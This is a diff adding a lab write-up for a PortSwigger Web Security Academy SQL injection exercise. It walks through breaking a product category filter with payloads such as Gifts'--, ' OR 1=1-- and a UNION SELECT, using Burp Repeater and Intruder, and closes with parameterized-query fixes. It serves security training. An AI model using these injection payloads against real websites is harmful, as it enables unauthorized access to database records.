@@ -1,0 +1,88 @@
+# SQL injection Lab1
+# Objectives
+ Exploit a SQL injection vulnerability in the product category filter to display all products, including unreleased ones.
+# Key Takeaways
+    - Demonstrated how to break query logic with SQL injection
+    - Showed how comments (--) can remove security checks
+    - Revealed the danger of concatenating user input into queries
+
+# Scenario
+    1.Access the lab (you'll get a unique URL when you start it)
+    2.You'll see an e-commerce site with a "Gifts" category filter
+    3.When you click "Gifts", the URL becomes.
+          The backend query likely looks like:
+
+                  SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+    4.Add a single quote to break the SQL syntax:
+
+                  https://<lab-id>.web-security-academy.net/filter?category=Gifts'
+
+            If you get an error, it confirms SQL injection is possible
+
+    5.Now try commenting out the rest of the query:
+                  https://<lab-id>.web-security-academy.net/filter?category=Gifts'--
+
+            The -- is a SQL comment that makes the server ignore everything after it
+            The query becomes: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+            This might work, but some databases require a space after --
+            Try with proper spacing (URL-encoded space is %20):
+                    
+                  https://<lab-id>.web-security-academy.net/filter?category=Gifts'--%20
+
+# Query 
+      SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+      SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+
+# Alternative Payloads
+      Gifts'-- (Simple comment)
+      Gifts' /* (Alternative comment syntax)
+      '+UNION+SELECT+NULL,NULL+FROM+products-- (UNION-based approach)
+
+# Note 
+    - -- for most databases (requires space after in some)
+    - # for MySQL
+    - /* */ for block comments
+
+# Prevention
+Prevention
+  The proper fix is to use parameterized queries:
+  ```java
+    String query = "SELECT * FROM products WHERE category = ? AND released = 1";
+    PreparedStatement stmt = conn.prepareStatement(query);
+    stmt.setString(1, category);
+
+# Burp Suite 
+  Open Burp Suite and go to the Proxy tab
+  Ensure "Intercept is on" to capture requests
+  Configure your browser to use Burp as a proxy
+  Access the lab URL in your browser
+  Click on any category (e.g., "Gifts")
+  The request will appear in Burp's Proxy tab
+  Right-click the captured request and select "Send to Repeater"
+  In the Repeater tab, observe the parameter:
+        GET /filter?category=Gifts HTTP/1.1
+  Modify the category parameter to:
+        category=Gifts'
+  Try commenting out the rest of the query:
+        category=Gifts'--
+  Modify the parameter to bypass the filter:
+        category=Gifts'+OR+1=1--
+  This becomes in SQL:
+        SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+
+  #Note 
+    Try these variations in Repeater:
+        category=Gifts'/*
+        category=Gifts'%20OR%201=1--
+    Send the request to Intruder
+    Mark the category parameter as payload position
+    Use this payload list:
+          Gifts'
+          Gifts'--
+          Gifts' OR 1=1--
+          Gifts'/*
+ # Prevention
+    String query = "SELECT * FROM products WHERE category = ? AND released = 1";
+    PreparedStatement stmt = connection.prepareStatement(query);
+    stmt.setString(1, request.getParameter("category"));
